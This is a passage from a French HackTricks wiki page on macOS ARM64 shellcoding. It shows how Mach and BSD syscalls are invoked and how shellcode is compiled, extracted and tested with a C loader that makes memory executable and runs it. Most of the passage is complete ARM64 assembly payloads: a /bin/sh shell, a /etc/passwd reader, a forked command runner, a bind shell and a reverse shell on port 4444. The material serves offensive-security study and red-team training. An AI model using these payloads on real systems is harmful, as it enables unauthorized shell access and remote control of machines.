Consultez [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html). Les pièges Mach auront **x16 < 0**, donc vous devez appeler les numéros de la liste précédente avec un **moins** : **`_kernelrpc_mach_vm_allocate_trap`** est **`-10`**.

Vous pouvez également consulter **`libsystem_kernel.dylib`** dans un désassembleur pour savoir comment appeler ces appels système (et BSD) :
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
Parfois, il est plus facile de vérifier le code **décomplié** de **`libsystem_kernel.dylib`** que de vérifier le **code source** car le code de plusieurs appels système (BSD et Mach) est généré via des scripts (vérifiez les commentaires dans le code source) tandis que dans le dylib, vous pouvez voir ce qui est appelé.
{% endhint %}

### Shellcodes

Pour compiler :
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Pour extraire les octets :
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>Code C pour tester le shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Coquille

Extrait de [**ici**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) et expliqué.

{% tabs %}
{% tab title="avec adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="avec pile" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
#### Lire avec cat

L'objectif est d'exécuter `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, donc le deuxième argument (x1) est un tableau de paramètres (ce qui signifie en mémoire une pile d'adresses).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Appeler une commande avec sh à partir d'une fourche pour que le processus principal ne soit pas tué
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Coquille de liaison

Coquille de liaison depuis [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) sur le **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Coquille inversée

Depuis [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell vers **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'équipe rouge HackTricks AWS)</strong></a><strong>!</strong></summary>

D'autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
